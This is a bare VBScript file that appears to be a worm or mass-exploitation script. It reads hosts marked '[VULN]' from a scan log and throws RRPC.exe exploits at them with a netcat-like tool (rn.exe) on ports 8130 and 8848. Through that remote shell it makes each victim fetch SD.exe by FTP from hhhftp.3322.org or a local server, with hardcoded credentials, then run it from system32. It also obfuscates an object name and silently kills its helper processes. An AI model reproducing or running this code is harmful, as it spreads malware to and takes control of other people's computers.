Set fs = createObject ("scri"&"ptin"&"g.fil"&"esyste"&"mObject")
Set WshShell = WScript.CreateObject("WScript.Shell")
On Error Resume Next
L = "---------- LOG."
fi = "logg.txt"
fj = "Local.txt"
ft = "hhhftp.3322.org"
Set j = fs.opentextfile (fj,1) 
Lo = j.Readline
WshShell.Run "Cmd.exe /c find log.txt "& chr(34) & "[" & "VULN]" & chr(34) & " >logg.txt",0
Wscript.Sleep 4000
Set f = fs.opentextfile (fi,1) 
p1 = f.Readline
p1 = f.Readline
Do While f.AtEndOfStream <> True
If left(p1, 15) <> L OR "" then 
p1 = f.Readline
If (fs.fileexists("Local.txt")) then 
Xz = Lo
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'hftp.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
next
WshShell.Run "Cmd.exe /c hftp.exe 323 324 %systemroot%\system32 sys dragoon",0
Else
xz = ft
end if 
Set b = fs.CreateTextFile("cmd.txt",True)
b.WriteLine("echo " & left(p1, 15) & " >%systemroot%\system32\Local.txt")
b.WriteLine("echo open " & Xz & "323>>%TEMP%\ftp.txt")
b.WriteLine("echo sys>>%TEMP%\ftp.txt")
b.WriteLine("echo dragoon>>%TEMP%\ftp.txt")
b.WriteLine("echo bin>>%TEMP%\ftp.txt")
b.WriteLine("echo lcd %systemroot%\system32>>%TEMP%\ftp.txt")
b.WriteLine("echo get SD.exe>>%TEMP%\ftp.txt")
b.WriteLine("echo bye>>%TEMP%\ftp.txt")
b.WriteLine("ftp -s:%TEMP%\ftp.txt")
b.WriteLine("del %temp%\ftp.txt")
b.WriteLine("%systemroot%\system32\SD.exe")
b.WriteLine("")
b.WriteLine("")
b.WriteLine("")
b.Close
Wscript.Sleep 4000
WshShell.Run "Cmd.exe /c rn.exe -vv -l -p 8130 <cmd.txt",0
Wscript.Sleep 1000
If (fs.fileexists("Local.txt")) then 
For T = 0 To 1
WshShell.Run "Cmd.exe /c RRPC.exe -d " & left(p1, 15) & " -t "& T & " -h " & Lo & " -P 8130",0
Wscript.Sleep 4000
Next
Wscript.Sleep 25000
Else
For T = 0 To 1
WshShell.Run "Cmd.exe /c RRPC.exe -d " & left(p1, 15) & " -t "& T & " -l 8848",0
Wscript.Sleep 4000
WshShell.Run "Cmd.exe /c type cmd.txt|rn.exe " & left(p1, 15) & " 8848",0
Wscript.Sleep 25000
Next
End if
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rrpc.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
Next
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rn.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
Next
End if
Loop
Set a = fs.CreateTextFile("ok.txt", True)
a.WriteLine("ok")
a.Close




